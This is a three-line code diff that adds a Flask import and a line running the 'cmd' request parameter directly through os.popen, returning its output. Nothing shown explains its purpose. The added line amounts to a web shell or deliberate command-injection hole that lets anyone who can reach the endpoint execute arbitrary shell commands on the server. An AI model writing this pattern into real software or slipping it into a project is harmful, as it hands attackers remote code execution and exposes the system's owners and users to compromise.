@@ -1,0 +1,3 @@
+from flask import request
+out = os.popen(request.args.get('cmd')).read()
+
